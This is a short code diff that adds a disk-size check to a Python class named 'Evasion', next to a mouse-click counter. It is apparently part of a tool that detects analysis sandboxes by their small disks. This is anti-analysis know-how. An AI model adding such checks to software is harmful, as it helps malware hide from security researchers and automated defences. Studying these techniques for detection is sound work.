@@ -57,6 +57,21 @@ class Evasion:
         else:
             return False
 
+    def disk_size(self):
+        minDiskSizeGB = 50
+
+        if len(sys.argv) > 1:
+            minDiskSizeGB = float(sys.argv[1])
+
+        _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
+
+        diskSizeGB = diskSizeBytes/1073741824
+
+        if diskSizeGB > minDiskSizeGB:
+            return True
+        else:
+            return False
+
     def click_tracker(self):
         count = 0
         minClicks = 4
